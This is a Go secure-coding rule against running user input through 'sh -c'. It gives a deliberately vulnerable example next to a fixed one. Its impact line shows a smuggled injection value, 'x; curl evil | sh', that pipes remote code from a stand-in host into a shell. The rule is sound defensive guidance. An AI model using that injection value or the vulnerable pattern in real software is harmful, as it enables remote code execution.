---
id: go-exec-no-shell
title: Run exec.Command with the binary and separate args, never through sh -c
impact: CRITICAL
impactDescription: "a value like `x; curl evil | sh` runs arbitrary commands on the host"
roles: [implementer, reviewer, security]
check: "rg -n 'exec\\.Command(Context)?\\([^)]*\"(ba)?sh\"' --type go"
tags: security, go
---
Source: request values, filenames, DB values. Sink: `exec.Command("sh", "-c", ...)` or `bash -c`. Pass each argument separately so no shell parses it; put `--` before user values the tool could read as flags. Use `exec.CommandContext` so the process dies with the request.

**Incorrect:**

```go
cmd := exec.Command("sh", "-c", "convert "+r.FormValue("file")+" out.png")
```

**Correct:**

```go
cmd := exec.CommandContext(ctx, "convert", "--", uploadPath, "out.png")
```

Reference: https://pkg.go.dev/os/exec
